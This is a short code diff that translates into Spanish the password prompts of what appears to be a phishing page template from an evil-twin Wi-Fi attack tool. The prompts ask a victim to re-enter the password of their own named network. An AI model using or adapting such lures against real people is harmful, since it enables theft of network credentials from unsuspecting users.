@@ -341,7 +341,7 @@
 			    document.getElementById("button-join").click();
             } else if (pw_status == "fail") {
                 alert("Wrong password! Please re-enter the password.");
-		        var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+		        var popup = prompt('La Red Wi-Fi ″{{ target_ap_essid }}″ requiere su {{ target_ap_encryption }} Contraseña.', '');
                 if (popup != null) { 
                     validate_passphrase(popup, mobile_validate_action);
                 }
@@ -352,7 +352,7 @@
         }
 
         function load_mobile() {
-		    var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+		    var popup = prompt('La Red Wi-Fi ″{{ target_ap_essid }}″ requiere su {{ target_ap_encryption }} Contraseña.', '');
 		    if (popup != null) {
                 validate_passphrase(popup, mobile_validate_action);
 		    }
